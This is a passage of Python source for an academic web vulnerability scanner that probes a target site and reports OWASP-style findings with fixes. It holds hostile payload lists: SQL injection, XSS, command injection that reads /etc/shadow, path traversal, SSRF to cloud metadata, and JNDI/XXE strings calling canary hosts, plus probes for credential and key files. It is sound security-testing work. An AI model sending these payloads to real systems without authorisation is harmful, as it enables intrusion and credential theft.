"""
===============================================================
  CYBRAIN - Complete Vulnerability Scanner  (v2.0)
  OWASP Top 10 2025 + CWE/SANS Top 25 + Extended Checks
  PFE Master 2 - Information Security
  University of Mohamed Boudiaf, M'sila - Algeria

  COVERAGE
  ????????
  * SQL Injection      - error, union, boolean, time-based, auth bypass
  * XSS               - reflected, DOM, stored, CSP bypass
  * Command Injection  - Unix + Windows
  * SSTI              - Jinja2, Twig, Freemarker, Velocity, Mako, Smarty
  * Path Traversal/LFI - encoded, double-encoded, null byte
  * XXE               - classic + blind OOB
  * SSRF              - internal IPs, cloud metadata, DNS rebind
  * IDOR / BAC
  * Auth Failures      - default creds, JWT alg:none, weak sessions
  * Security Misconfig - headers, 60+ sensitive files, CORS
  * Crypto Failures    - HTTP, cookies, weak JWT
  * CSRF
  * Open Redirect
  * HTTP Method Abuse  - TRACE, PUT, DELETE
  * Clickjacking
  * Host Header Injection
  * Insecure Deserialization - signature-based detection
  * Race Condition, Mass Assignment, Log4Shell, GraphQL (via url_scanner)

  NO system commands ? NO destructive payloads ? EDUCATIONAL USE ONLY
===============================================================
"""

import requests
import re
import json
import time
import base64
import threading
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urlencode, urlunparse, parse_qs

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BROWSER_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/122.0.0.0 Safari/537.36"
)

# ?? SQL error signatures ????????????????????????????????????????????????????
DB_ERRORS = [
    "sql syntax", "mysql_fetch", "mysql_num_rows", "sqlite",
    "ora-", "pg_query", "pg_exec", "microsoft ole db",
    "syntax error near", "unclosed quotation mark",
    "quoted string not properly", "you have an error in your sql",
    "warning: mysql", "jdbc", "sqlexception", "odbc", "db2",
    "division by zero", "invalid query", "supplied argument is not",
    "mysqli_", "mssql_", "pg_connect", "mysql error", "database error",
]

# ?? XSS payloads ????????????????????????????????????????????????????????????
XSS_PAYLOADS = [
    "<script>alert('xss_cybrain_2025')</script>",
    "<img src=x onerror=alert(1)>",
    '"><svg onload=alert(1)>',
    "<body onload=alert(1)>",
    "';alert(String.fromCharCode(88,83,83))//",
    "<iframe src=javascript:alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "javascript:alert(document.domain)",
    "<details open ontoggle=alert(1)>",
    "<math><mtext></math><img src=x onerror=alert(1)>",
    # CSP bypass variants
    "<script src=//cdn.cybrain.invalid></script>",
    "<link rel=import href=data:text/html,<script>alert(1)</script>>",
    "<object data=javascript:alert(1)>",
    "<base href=javascript:alert(1)//>",
    # DOM XSS triggers
    "'-alert(1)-'",
    "\"-alert(1)-\"",
    "</script><script>alert(1)</script>",
    "<script>document.write('<img src=x onerror=alert(1)>')</script>",
]

# ?? XSS DOM sinks to look for in source ????????????????????????????????????
DOM_SINKS = [
    "document.write(", "document.writeln(",
    "innerHTML", "outerHTML", "insertAdjacentHTML",
    "eval(", "setTimeout(", "setInterval(",
    "location.href", "location.replace(",
    "window.location", "document.location",
    "$.html(", "$(", ".html(",
]
DOM_SOURCES = [
    "location.hash", "location.search",
    "location.href", "document.referrer",
    "window.name", "document.URL",
    "document.baseURI",
]

# ?? SQLi payloads ????????????????????????????????????????????????????????????
SQLI_ERROR_PAYLOADS = [
    ("'",                       "Single quote"),
    ("''",                      "Double quote"),
    ("1' OR '1'='1",            "OR bypass"),
    ("1' OR '1'='1'--",         "OR bypass comment"),
    ("1' ORDER BY 100--",       "ORDER BY probe"),
    ("' UNION SELECT NULL--",   "UNION probe"),
    ("' UNION SELECT NULL,NULL--", "UNION 2col"),
    ("admin'--",                "Comment bypass"),
    ("' OR 1=1--",              "OR 1=1"),
    ("1) OR (1=1",              "Parenthesis bypass"),
]

SQLI_BOOLEAN_PAYLOADS = [
    ("1 AND 1=1", "1 AND 1=2"),   # true vs false
    ("1' AND '1'='1", "1' AND '1'='2"),
    ("1 AND 2>1",  "1 AND 2<1"),
]

SQLI_TIME_PAYLOADS = [
    ("1; WAITFOR DELAY '0:0:3'--", 3.0, "MSSQL time delay"),
    ("1' AND SLEEP(3)--",          3.0, "MySQL SLEEP"),
    ("1; SELECT pg_sleep(3)--",    3.0, "PostgreSQL sleep"),
    ("1 AND 1=1 WAITFOR DELAY '0:0:3'--", 3.0, "MSSQL alt"),
    ("1'||DBMS_PIPE.RECEIVE_MESSAGE('a',3)--", 3.0, "Oracle pipe"),
]

# ?? Command injection ????????????????????????????????????????????????????????
CMD_PAYLOADS = [
    ("; id",             "Semicolon id"),
    ("| id",             "Pipe id"),
    ("; cat /etc/passwd","Read passwd"),
    ("`id`",             "Backtick"),
    ("$(id)",            "Dollar paren"),
    ("; sleep 3",        "Sleep test"),
    ("| whoami",         "Whoami"),
    ("; uname -a",       "System info"),
    ("& ipconfig",       "Windows ipconfig"),
    ("| dir",            "Windows dir"),
    ("| type C:\\Windows\\win.ini", "Win.ini"),
    ("; cat /etc/shadow","Shadow file"),
]
CMD_SIGNS = [
    "root:", "bin/bash", "bin/sh", "www-data",
    "uid=", "gid=", "total ", "windows ip",
    "volume in drive", "directory of",
    "linux", "darwin", "freebsd",
    "[extensions]", "[fonts]",
]

# ?? SSTI payloads - covers Jinja2, Twig, Freemarker, Velocity, Mako, Smarty
SSTI_PAYLOADS = {
    # Jinja2 / Mako
    "{{7*7}}":                        "49",
    "{{7*'7'}}":                      "7777777",
    "{{config}}":                     "Config",
    "{{''.__class__}}":               "str",
    "{{request.application}}":        "Flask",
    # Twig
    "{{7*7}}":                        "49",
    "{%- set x = 7*7 -%}{{x}}":      "49",
    # Freemarker
    "${7*7}":                         "49",
    "<#assign x=7*7>${x}":           "49",
    # Velocity
    "#set($x=7*7)$x":                "49",
    # Smarty
    "{math equation='7*7'}":         "49",
    "{$smarty.version}":             "Smarty",
    # Generic
    "#{7*7}":                        "49",
    "<%= 7*7 %>":                    "49",
    "@(7*7)":                        "49",
    "*{7*7}":                        "49",
}

# ?? Path traversal ????????????????????????????????????????????????????????????
PATH_TRAVERSAL = [
    # Classic
    "../../../etc/passwd",
    "../../../../etc/passwd",
    # Double-encoded
    "..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    # Double double-encoded
    "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    # Null byte (PHP legacy)
    "../../../etc/passwd%00",
    "../../../etc/passwd\x00",
    # Obfuscated dots
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    # Windows
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts",
    # UNC / absolute
    "/etc/passwd",
    "file:///etc/passwd",
]
TRAVERSAL_SIGNS = [
    "root:x:", "daemon:", "/bin/bash",
    "/etc/passwd", "[drivers]", "[fonts]",
]

# ?? XXE payloads ?????????????????????????????????????????????????????????????
XXE_CLASSIC = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<test>&xxe;</test>"""

XXE_BLIND = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY % remote SYSTEM "http://cybrain-xxe-canary.invalid/xxe">
  %remote;
]>
<test>blind xxe probe</test>"""

XXE_SIGNS = ["root:x:", "/bin/bash", "daemon:", "etc/passwd"]

# ?? SSRF payloads ?????????????????????????????????????????????????????????????
SSRF_PAYLOADS = [
    # Internal IPs
    "http://127.0.0.1",
    "http://127.0.0.1:80",
    "http://127.0.0.1:8080",
    "http://localhost",
    "http://0.0.0.0",
    "http://[::1]",
    # Cloud metadata
    "http://169.254.169.254/latest/meta-data/",         # AWS
    "http://169.254.169.254/latest/meta-data/iam/",     # AWS IAM
    "http://metadata.google.internal/computeMetadata/v1/",  # GCP
    "http://169.254.169.254/metadata/v1/",              # DigitalOcean
    "http://100.100.100.200/latest/meta-data/",         # Alibaba
    # DNS rebind simulation
    "http://cybrain-ssrf-rebind.invalid",
    # Private ranges
    "http://192.168.1.1",
    "http://10.0.0.1",
    "http://172.16.0.1",
    "file:///etc/passwd",
]
SSRF_SIGNS = [
    "root:", "localhost", "127.0.0.1",
    "metadata", "ami-id", "instance-id",
    "ssh-rsa", "169.254", "iam/",
    "computemetadata", "security-credentials",
]
SSRF_PARAMS = [
    "url", "redirect", "proxy", "fetch", "src",
    "href", "load", "target", "image", "file",
    "path", "resource", "link", "uri", "addr",
    "host", "dest", "to", "next", "data",
]

# ?? Sensitive files (60+) ?????????????????????????????????????????????????????
SENSITIVE_FILES = {
    # Credentials / secrets
    "/.env":                  ("CRITICAL", "password|secret|key|db_"),
    "/.env.local":            ("CRITICAL", ""),
    "/.env.production":       ("CRITICAL", ""),
    "/.env.backup":           ("CRITICAL", ""),
    "/config/secrets.yml":    ("CRITICAL", "secret"),
    "/config/database.yml":   ("CRITICAL", "password"),
    "/config.php":            ("CRITICAL", "password|db_pass"),
    "/config.php.bak":        ("CRITICAL", "password"),
    "/wp-config.php":         ("CRITICAL", "db_password"),
    "/web.config":            ("HIGH",     "connectionstring|password"),
    "/settings.py":           ("HIGH",     "secret_key|password"),
    "/application.properties":("HIGH",     "password|secret"),
    "/application.yml":       ("HIGH",     "password|secret"),
    # Source control
    "/.git/config":           ("CRITICAL", "[core]"),
    "/.git/HEAD":             ("HIGH",     "ref:"),
    "/.git/COMMIT_EDITMSG":   ("HIGH",     ""),
    "/.gitignore":            ("LOW",      ""),
    "/.svn/entries":          ("HIGH",     ""),
    "/.hg/hgrc":              ("HIGH",     ""),
    # Backups / dumps
    "/backup.zip":            ("CRITICAL", ""),
    "/backup.tar.gz":         ("CRITICAL", ""),
    "/backup.sql":            ("CRITICAL", "insert into|create table"),
    "/dump.sql":              ("CRITICAL", "insert into|create table"),
    "/database.sql":          ("CRITICAL", "insert into|create table"),
    "/db_backup.sql":         ("CRITICAL", ""),
    "/site_backup.zip":       ("CRITICAL", ""),
    # PHP info / debug
    "/phpinfo.php":           ("HIGH",     "phpinfo"),
    "/info.php":              ("HIGH",     "phpinfo"),
    "/test.php":              ("MEDIUM",   ""),
    "/debug.php":             ("HIGH",     ""),
    "/php_info.php":          ("HIGH",     "phpinfo"),
    # Server status
    "/server-status":         ("HIGH",     "apache server status"),
    "/server-info":           ("HIGH",     "apache"),
    "/.htaccess":             ("MEDIUM",   "rewriterule|deny"),
    "/nginx.conf":            ("HIGH",     "server_name|listen"),
    # SSH / keys
    "/.ssh/id_rsa":           ("CRITICAL", "-----begin"),
    "/id_rsa":                ("CRITICAL", "-----begin"),
    "/private.key":           ("CRITICAL", "-----begin"),
    "/certificate.pem":       ("HIGH",     "-----begin"),
    "/server.key":            ("CRITICAL", "-----begin"),
    # Cloud / DevOps
    "/.npmrc":                ("HIGH",     "_auth|token"),
    "/.dockerenv":            ("MEDIUM",   ""),
    "/docker-compose.yml":    ("HIGH",     "password|secret"),
    "/Dockerfile":            ("LOW",      ""),
    "/.aws/credentials":      ("CRITICAL", "aws_access_key"),
    "/terraform.tfstate":     ("CRITICAL", "password|secret"),
    # Logs
    "/logs/access.log":       ("HIGH",     "get /|post /"),
    "/logs/error.log":        ("HIGH",     "error|exception"),
    "/debug.log":             ("HIGH",     ""),
    "/error.log":             ("HIGH",     ""),
    "/storage/logs/laravel.log": ("HIGH",  "exception"),
    # API / Swagger
    "/swagger.json":          ("LOW",      "swagger"),
    "/swagger.yaml":          ("LOW",      "swagger"),
    "/api/swagger":           ("LOW",      "swagger"),
    "/openapi.json":          ("LOW",      "openapi"),
    "/api-docs":              ("LOW",      "swagger"),
    # Spring Boot Actuator
    "/actuator":              ("HIGH",     ""),
    "/actuator/env":          ("CRITICAL", ""),
    "/actuator/health":       ("MEDIUM",   ""),
    "/actuator/mappings":     ("HIGH",     ""),
    "/actuator/beans":        ("HIGH",     ""),
    "/metrics":               ("MEDIUM",   ""),
    # Misc
    "/robots.txt":            ("LOW",      "user-agent"),
    "/sitemap.xml":           ("LOW",      ""),
    "/crossdomain.xml":       ("MEDIUM",   "allow-access-from"),
    "/.DS_Store":             ("LOW",      ""),
    "/.bash_history":         ("CRITICAL", ""),
    "/.zsh_history":          ("CRITICAL", ""),
    "/package.json":          ("LOW",      ""),
    "/composer.json":         ("LOW",      ""),
    "/yarn.lock":             ("LOW",      ""),
    "/.well-known/":          ("LOW",      ""),
}

# ?? Insecure deserialization signatures ??????????????????????????????????????
DESER_SIGNS = {
    # Java serialized object magic bytes (base64 encoded rO0)
    "java_serial":   (b"\xac\xed\x00\x05", "rO0AB"),
    # PHP serialized
    "php_serial":    (b"O:", "s:"),
    # Python pickle
    "python_pickle": (b"\x80\x02", b"\x80\x03"),
    # .NET ViewState
    "dotnet_viewstate": ("__VIEWSTATE", "/wEy"),
}

# ?? Race condition test configuration ????????????????????????????????????????
RACE_ENDPOINTS = ["/login", "/api/login", "/signin", "/register", "/api/register", "/forgot-password"]
RACE_CONCURRENT_REQUESTS = 20          # Number of concurrent requests to send
RACE_SUCCESS_INDICATORS = ["welcome", "dashboard", "token", "success", "logged in"]

# ?? GraphQL endpoints and introspection query ????????????????????????????????
GRAPHQL_PATHS = [
    "/graphql", "/graphql/", "/api/graphql", "/v1/graphql", "/gql", "/query",
    "/api", "/api/v1", "/explorer", "/playground", "/console"
]
GRAPHQL_INTROSPECTION_QUERY = """
query { __schema { types { name fields { name } } } }
"""
GRAPHQL_ERROR_SIGNS = ["graphql", "validation error", "syntax error", "bad request", "cannot query field"]

# ?? Log4Shell / Spring4Shell payloads ????????????????????????????????????????
LOG4SHELL_PAYLOADS = [
    "${jndi:ldap://cybrain-log4shell-canary.com/a}",
    "${jndi:rmi://cybrain-log4shell-canary.com/a}",
    "${jndi:dns://cybrain-log4shell-canary.com/a}",
    "${${lower:j}ndi:${lower:l}dap://cybrain-log4shell-canary.com/a}",
    "${jndi:ldap://127.0.0.1:1389/a}",
    "${jndi:rmi://127.0.0.1:1099/a}",
    "${jndi:ldap://localhost:389/cn=exploit}",
]
LOG4SHELL_HEADERS = [
    "X-Api-Version", "User-Agent", "Referer", "X-Forwarded-For",
    "X-Originating-IP", "X-Remote-IP", "X-Client-IP", "X-Real-IP",
    "Forwarded", "X-Original-URL", "X-Rewrite-URL", "X-HTTP-Method-Override"
]
LOG4SHELL_PARAMS = ["id", "name", "user", "username", "q", "search", "redirect", "url"]
LOG4SHELL_SIGNS = ["jndi", "ldap", "rmi", "dns", "lookup", "error", "exception", "javax.naming"]

# ?? Mass Assignment test parameters ??????????????????????????????????????????
MASS_ASSIGN_PARAMS = [
    ("admin", "true"), ("role", "admin"), ("is_admin", "1"),
    ("privileged", "true"), ("access_level", "999"),
    ("permissions", "*"), ("enabled", "true"), ("verified", "true"),
    ("user[admin]", "1"), ("user[role]", "admin"), ("_method", "PUT"),
    ("_extra", "parameter"), ("debug", "true"), ("test", "1"),
]


class OWASPChecker:
    """
    OWASP Top 10 2025 + CWE/SANS Top 25.
    Pure technical detection - zero AI involvement.
    """

    def __init__(self, target_url, session, timeout=12, fast_mode=True):
        self.target    = target_url.split("#")[0].rstrip("/")
        self.base      = self._base(self.target)
        self.session   = session
        self.timeout   = timeout
        self.fast_mode = fast_mode
        self.findings  = []
        self.discovered_links  = set()
        self.discovered_forms  = []
        self.discovered_params = set()
        self._lock = threading.Lock()

    # ?? Helpers ???????????????????????????????????????????????????????????

    def _base(self, url):
        p = urlparse(url)
        return f"{p.scheme}://{p.netloc}"

    def _get(self, url, extra_headers=None, **kw):
        h = {"User-Agent": BROWSER_UA}
        if extra_headers:
            h.update(extra_headers)
        try:
            return self.session.get(
                url, timeout=self.timeout, verify=False,
                allow_redirects=True, headers=h, **kw
            )
        except Exception:
            return None

    def _post(self, url, json_data=None, data=None, headers=None, **kw):
        h = {"User-Agent": BROWSER_UA}
        if headers:
            h.update(headers)
        try:
            return self.session.post(
                url, json=json_data, data=data, headers=h,
                timeout=self.timeout, verify=False, **kw
            )
        except Exception:
            return None

    def _add(self, owasp_id, owasp_name, severity, title,
             description, evidence="", fix="", cwe="", cvss="", sans=""):
        with self._lock:
            self.findings.append({
                "owasp_id": owasp_id, "owasp_name": owasp_name,
                "severity": severity, "title": title,
                "description": description, "evidence": evidence,
                "fix": fix, "cwe": cwe, "cvss": cvss,
                "sans": sans, "target": self.target,
            })

    def _build_url(self, path="", params=None):
        p = urlparse(self.target)
        path = path or p.path
        q = urlencode(params) if params else ""
        return urlunparse((p.scheme, p.netloc, path, "", q, ""))

    def _spider_target(self, html):
        """Extract links, forms, and parameters from page HTML."""
        print("[CYBRAIN] Spidering target for dynamic inputs...")

        links = re.findall(r'href=["\'](/?[\w\-/.]+)["\']', html)
        for link in links:
            if link.startswith("/") and len(link) > 1:
                self.discovered_links.add(link)
            if "?" in link:
                p_part = link.split("?")[1]
                for kv in p_part.split("&"):
                    if "=" in kv:
                        self.discovered_params.add(kv.split("=")[0])

        forms = re.findall(r'<form[^>]*>(.*?)</form>', html, re.DOTALL | re.IGNORECASE)
        for form_html in forms:
            action_m = re.search(r'action=["\']([^"\']+)["\']', form_html, re.IGNORECASE)
            method_m = re.search(r'method=["\']([^"\']+)["\']', form_html, re.IGNORECASE)
            action = action_m.group(1) if action_m else ""
            method = method_m.group(1).upper() if method_m else "GET"
            inputs = re.findall(r'name=["\']([^"\']+)["\']', form_html, re.IGNORECASE)
            if inputs:
                self.discovered_forms.append({"action": action, "method": method, "params": inputs})
                for inp in inputs:
                    self.discovered_params.add(inp)

        print(f"[CYBRAIN] Found {len(self.discovered_links)} links, "
              f"{len(self.discovered_forms)} forms, "
              f"{len(self.discovered_params)} params.")

        if any(s in html.lower() for s in ["bundle.js", "react.js", "app.js", "chunk.js"]):
            print("[CYBRAIN] SPA detected - adding API endpoints.")
            for ep in ["/api", "/v1", "/api/v1"]:
                self.discovered_links.add(ep)

    # ==============================================================
    #  MAIN RUN
    # ==============================================================

    def run_all(self):
        print("[CYBRAIN] Starting full scan...")
        resp = self._get(self.target)
        if resp is None:
            print("[CYBRAIN] Target unreachable.")
            return self.findings

        print(f"[CYBRAIN] Status: {resp.status_code}")
        self._spider_target(resp.text)

        checks = [
            (self._a01_broken_access_control,      (resp,)),
            (self._a02_security_misconfiguration,  (resp,)),
            (self._a03_supply_chain,               (resp,)),
            (self._a04_cryptographic_failures,     (resp,)),
            (self._a05_injection,                  (resp,)),
            (self._a06_insecure_design,            (resp,)),
            (self._a07_auth_failures,              (resp,)),
            (self._a08_integrity_failures,         (resp,)),
            (self._a09_logging_failures,           (resp,)),
            (self._a10_mishandling_exceptions,     (resp,)),
        ]

        with ThreadPoolExecutor(max_workers=8) as ex:
            futures = {ex.submit(fn, *args): fn.__name__ for fn, args in checks}
            for future in as_completed(futures):
                try:
                    future.result(timeout=30)
                except Exception as e:
                    print(f"[CYBRAIN] Check {futures[future]} error: {e}")

        # Sequential extras
        self._cwe_path_traversal()
        self._cwe_xxe()
        self._cwe_open_redirect()
        self._cwe_clickjacking(resp)
        self._cwe_host_header_injection()
        self._cwe_http_methods()
        self._cwe_unrestricted_upload()
        self._cwe_insecure_deserialization(resp)
        self._dom_xss(resp)
        self._stored_xss_check()
        self._csp_bypass_xss(resp)
        self._sqli_boolean()
        self._sqli_time_based()
        self._ssrf_extended()

        # Additional modern checks
        self._race_condition_check()
        self._graphql_introspection()
        self._log4shell_check()
        self._mass_assignment_check()

        print(f"[CYBRAIN] Done. {len(self.findings)} findings.")
        return self.findings

    # ================================================
    #  A01 - BROKEN ACCESS CONTROL
    # ================================================
    def _a01_broken_access_control(self, resp):
        print("[A01:2025] Broken Access Control...")

        # IDOR
        idor_paths = [
            "/api/users/1", "/api/users/2", "/api/user/1",
            "/rest/user/1", "/user/1", "/account/1",
            "/profile/1", "/order/1", "/api/orders/1",
            "/invoice/1", "/api/v1/users/1", "/api/v2/users/1",
        ]
        for path in idor_paths:
            r = self._get(f"{self.base}{path}")
            if r and r.status_code == 200:
                body = r.text.lower()
                if any(s in body for s in [
                    "email", "username", "password", "address",
                    "phone", "credit", "firstname", "lastname",
                ]):
                    self._add(
                        "A01:2025", "Broken Access Control", "HIGH",
                        "Insecure Direct Object Reference (IDOR)",
                        f"Endpoint {path} returns user PII without authorization.",
                        evidence=f"GET {self.base}{path} -> 200 + PII",
                        fix=(
                            "1. Verify authenticated user owns the resource.\n"
                            "2. Use UUIDs instead of sequential IDs.\n"
                            "3. Implement object-level authorization checks."
                        ),
                        cwe="CWE-639", cvss="8.1", sans="SANS #1"
                    )
                    break

        # Admin panel
        admin_paths = [
            "/admin", "/admin/", "/administrator", "/admin/dashboard",
            "/admin/users", "/wp-admin", "/manager", "/console",
            "/api/admin", "/backend", "/admin/panel", "/superadmin",
        ]
        for path in admin_paths:
            r = self._get(f"{self.base}{path}")
            if r and r.status_code == 200:
                body = r.text.lower()
                if any(s in body for s in [
                    "dashboard", "admin", "manage", "users",
                    "settings", "panel", "statistics",
                ]):
                    self._add(
                        "A01:2025", "Broken Access Control", "CRITICAL",
                        f"Admin Panel Accessible: {path}",
                        f"Admin panel at {path} accessible without authentication.",
                        evidence=f"GET {self.base}{path} -> 200 + admin content",
                        fix=(
                            "1. Require auth + admin role on all admin routes.\n"
                            "2. Implement IP allowlisting.\n"
                            "3. Add MFA for admin access."
                        ),
                        cwe="CWE-284", cvss="9.8", sans="SANS #1"
                    )
                    break

        # CSRF
        if "<form" in resp.text.lower():
            has_csrf = any(t in resp.text.lower() for t in [
                "csrf", "_token", "xsrf", "authenticity_token",
                "requestverificationtoken", "csrfmiddlewaretoken",
            ])
            if not has_csrf:
                self._add(
                    "A01:2025", "Broken Access Control", "HIGH",
                    "Missing CSRF Protection",
                    "HTML forms detected without CSRF tokens.",
                    fix=(
                        "1. Add per-session CSRF token to all forms.\n"
                        "2. Validate server-side on every POST/PUT/DELETE.\n"
                        "3. Set SameSite=Strict on session cookies."
                    ),
                    cwe="CWE-352", cvss="8.8", sans="SANS #9"
                )

        # Forced browsing
        sensitive_paths = [
            "/backup", "/old", "/test", "/dev", "/staging",
            "/beta", "/tmp", "/temp", "/cache", "/logs",
        ]
        for path in sensitive_paths:
            r = self._get(f"{self.base}{path}")
            if r and r.status_code == 200 and len(r.text) > 200:
                self._add(
                    "A01:2025", "Broken Access Control", "MEDIUM",
                    f"Forced Browsing: {path}",
                    f"Path {path} accessible without authorization.",
                    evidence=f"GET {self.base}{path} -> 200 ({len(r.text)} bytes)",
                    fix="Restrict access; return 401/403 for unauthorized access.",
                    cwe="CWE-425", cvss="5.3"
                )
                break

        # HTTP method override
        for hdr in ["X-HTTP-Method-Override", "X-Method-Override", "X-HTTP-Method"]:
            r = self._get(self.target, extra_headers={hdr: "DELETE"})
            if r and r.status_code not in [405, 501]:
                self._add(
                    "A01:2025", "Broken Access Control", "MEDIUM",
                    f"HTTP Method Override ({hdr})",
                    "Server accepts method override headers - WAF bypass possible.",
                    evidence=f"{hdr}: DELETE -> {r.status_code}",
                    fix="Disable method override headers at framework level.",
                    cwe="CWE-650", cvss="6.5"
                )
                break

    # ================================================
    #  A02 - SECURITY MISCONFIGURATION
    # ================================================
    def _a02_security_misconfiguration(self, resp):
        print("[A02:2025] Security Misconfiguration...")

        # Missing security headers
        required = {
            "Content-Security-Policy":    ("HIGH",   "CWE-693", "Prevents XSS and data injection."),
            "Strict-Transport-Security":  ("HIGH",   "CWE-319", "Forces HTTPS."),
            "X-Frame-Options":            ("MEDIUM", "CWE-1021","Prevents clickjacking."),
            "X-Content-Type-Options":     ("MEDIUM", "CWE-693", "Prevents MIME sniffing."),
            "X-XSS-Protection":           ("MEDIUM", "CWE-693", "Legacy XSS filter."),
            "Referrer-Policy":            ("LOW",    "CWE-200", "Controls referrer leakage."),
            "Permissions-Policy":         ("LOW",    "CWE-284", "Restricts browser features."),
            "Cross-Origin-Opener-Policy": ("LOW",    "CWE-346", "Prevents cross-origin attacks."),
        }
        missing = [(h, s, c, d) for h, (s, c, d) in required.items() if h not in resp.headers]
        if missing:
            worst = "HIGH" if any(s == "HIGH" for _, s, _, _ in missing) else "MEDIUM"
            header_list = "\n* ".join(f"{h} [{s}] - {d}" for h, s, _, d in missing)
            self._add(
                "A02:2025", "Security Misconfiguration", worst,
                "Missing HTTP Security Headers",
                f"Missing headers:\n* {header_list}",
                fix=(
                    'Header always set Content-Security-Policy "default-src \'self\'"\n'
                    'Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"\n'
                    'Header always set X-Frame-Options "DENY"\n'
                    'Header always set X-Content-Type-Options "nosniff"'
                ),
                cwe="CWE-693", cvss="6.5"
            )

        # Server version disclosure
        for h in ("Server", "X-Powered-By", "X-AspNet-Version", "X-Generator"):
            if h in resp.headers:
                self._add(
                    "A02:2025", "Security Misconfiguration", "LOW",
                    f"Server Technology Disclosure ({h})",
                    f"Header {h}: {resp.headers[h]} reveals server technology.",
                    evidence=f"{h}: {resp.headers[h]}",
                    fix="ServerTokens Prod + ServerSignature Off (Apache); server_tokens off (Nginx)",
                    cwe="CWE-200", cvss="5.3"
                )

        # Sensitive files - parallel
        def _check_file(args):
            path, (sev, kw) = args
            try:
                r = self._get(f"{self.base}{path}")
                if r and r.status_code == 200:
                    content = r.text.lower()
                    is_spa = any(s in content for s in [
                        "<!doctype html", "<html", "bundle.js", "react.js",
                    ])
                    if path.endswith(".log") and is_spa:
                        return None
                    if not kw or any(k in content for k in kw.split("|")):
                        return {"path": path, "sev": sev, "size": len(r.text)}
            except Exception:
                pass
            return None

        with ThreadPoolExecutor(max_workers=20) as ex:
            futures = {ex.submit(_check_file, item): item for item in SENSITIVE_FILES.items()}
            for future in as_completed(futures):
                result = future.result()
                if result:
                    self._add(
                        "A02:2025", "Security Misconfiguration", result["sev"],
                        f"Sensitive File Exposed: {result['path']}",
                        f"Path {self.base}{result['path']} publicly accessible (HTTP 200).",
                        evidence=f"GET {self.base}{result['path']} -> 200 ({result['size']} bytes)",
                        fix=(
                            f"Remove {result['path']} from web root.\n"
                            "<Files .env>\n  Require all denied\n</Files>"
                        ),
                        cwe="CWE-200", cvss="7.5"
                    )

        # Directory listing
        if "Index of /" in resp.text and "<title>Index of" in resp.text:
            self._add(
                "A02:2025", "Security Misconfiguration", "HIGH",
                "Directory Listing Enabled",
                "Web server displays raw directory contents.",
                fix="Apache: add Options -Indexes to httpd.conf or .htaccess",
                cwe="CWE-548", cvss="7.5"
            )

        # CORS
        acao = resp.headers.get("Access-Control-Allow-Origin", "")
        acac = resp.headers.get("Access-Control-Allow-Credentials", "")
        if acao == "*":
            self._add(
                "A02:2025", "Security Misconfiguration", "MEDIUM",
                "CORS Wildcard Origin",
                "Access-Control-Allow-Origin: * permits any site to read API responses.",
                evidence="Access-Control-Allow-Origin: *",
                fix='Header set Access-Control-Allow-Origin "https://yourdomain.com"',
                cwe="CWE-942", cvss="6.5"
            )
        if acao and acac.lower() == "true":
            self._add(
                "A02:2025", "Security Misconfiguration", "HIGH",
                "CORS With Credentials Misconfiguration",
                f"Credentials allowed for origin {acao}. Session hijacking possible.",
                evidence=f"ACAO: {acao} | ACAC: true",
                fix="Validate Origin against strict server-side allowlist.",
                cwe="CWE-942", cvss="8.1"
            )

    # ================================================
    #  A03 - SOFTWARE SUPPLY CHAIN
    # ================================================
    def _a03_supply_chain(self, resp):
        print("[A03:2025] Software Supply Chain...")

        version_patterns = {
            "jQuery":   r"jquery[/-]([\d.]+)",
            "Bootstrap":r"bootstrap[/-]([\d.]+)",
            "Angular":  r"angular[/-]([\d.]+)",
            "React":    r"react[/-]([\d.]+)",
            "Apache":   r"Apache/([\d.]+)",
            "Nginx":    r"nginx/([\d.]+)",
            "PHP":      r"PHP/([\d.]+)",
            "Log4j":    r"log4j[/-]([\d.]+)",
            "Struts":   r"struts[/-]([\d.]+)",
            "Spring":   r"spring[/-]([\d.]+)",
        }
        critical_versions = {
            "Log4j":  ["2.0","2.1","2.2","2.3","2.4","2.5","2.6","2.7",
                       "2.8","2.9","2.10","2.11","2.12","2.13","2.14"],
            "Apache": ["2.4.49","2.4.50"],
        }
        all_text = resp.text + str(dict(resp.headers))
        for tech, pattern in version_patterns.items():
            m = re.search(pattern, all_text, re.IGNORECASE)
            if m:
                ver = m.group(1) if m.lastindex else "detected"
                sev = "MEDIUM"
                cve = ""
                if tech in critical_versions:
                    for vv in critical_versions[tech]:
                        if ver.startswith(vv):
                            sev = "CRITICAL"
                            cve = " (CVE-2021-44228 Log4Shell)" if tech == "Log4j" else " (CVE-2021-41773)"
                            break
                self._add(
                    "A03:2025", "Software Supply Chain Failures", sev,
                    f"Component Detected: {tech} {ver}{cve}",
                    f"{tech} {ver} detected. Outdated components are a primary attack vector.",
                    evidence=f"{tech} {ver} found in response",
                    fix=f"Update {tech} to latest stable version. Use OWASP Dependency-Check.",
                    cwe="CWE-1104",
                    cvss="9.8" if sev == "CRITICAL" else "6.8"
                )

        # External scripts without SRI
        sri_pattern = re.compile(
            r'<\s*script[^>]*src\s*=\s*["\'](https?://[^"\']+)["\']', re.IGNORECASE
        )
        count = 0
        for m in sri_pattern.finditer(resp.text):
            src = m.group(1)
            pos = resp.text.find(src)
            nearby = resp.text[max(0, pos-50):pos+150]
            if "integrity=" not in nearby.lower() and not src.startswith(self.base):
                count += 1
                if count <= 3:
                    self._add(
                        "A03:2025", "Software Supply Chain Failures", "MEDIUM",
                        "External Script Without SRI Hash",
                        f"Script from {src[:80]} loaded without Subresource Integrity hash.",
                        evidence=f'<script src="{src[:80]}">',
                        fix='Add integrity="sha384-HASH" crossorigin="anonymous" to script tags.',
